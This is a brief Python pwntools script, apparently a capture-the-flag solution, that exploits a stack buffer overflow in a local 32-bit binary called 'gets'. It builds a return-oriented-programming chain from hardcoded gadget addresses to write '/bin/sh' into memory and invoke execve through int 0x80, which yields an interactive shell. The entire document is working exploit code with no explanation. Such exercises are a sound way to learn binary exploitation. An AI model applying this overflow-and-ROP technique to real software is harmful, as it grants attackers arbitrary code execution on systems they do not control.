from pwn import *

p = process("./gets")
# execve("/bin/sh\x00" , null , null)
read = 0x0806D5F0
pop_ecx_ecx = 0x0804b5ea
pop_eax = 0x080b81c6
pop_ebx = 0x080481c9
pop_ecx = 0x080de955
pop_edx = 0x0806f02a
int_0x80 = 0x0806cc25

temp = 0x80EAFB4

payload = "a" * 0x18 + "b" * 4
payload += p32(pop_ecx) + p32(temp) + p32(pop_ecx_ecx) + "/bin" 
payload += p32(pop_ecx) + p32(temp + 4) + p32(pop_ecx_ecx) + "/sh\x00" 
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_ebx) + p32(temp)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx) + p32(0)
payload += p32(int_0x80)
p.sendlineafter("GIVE ME YOUR NAME!\n" , payload)
p.interactive()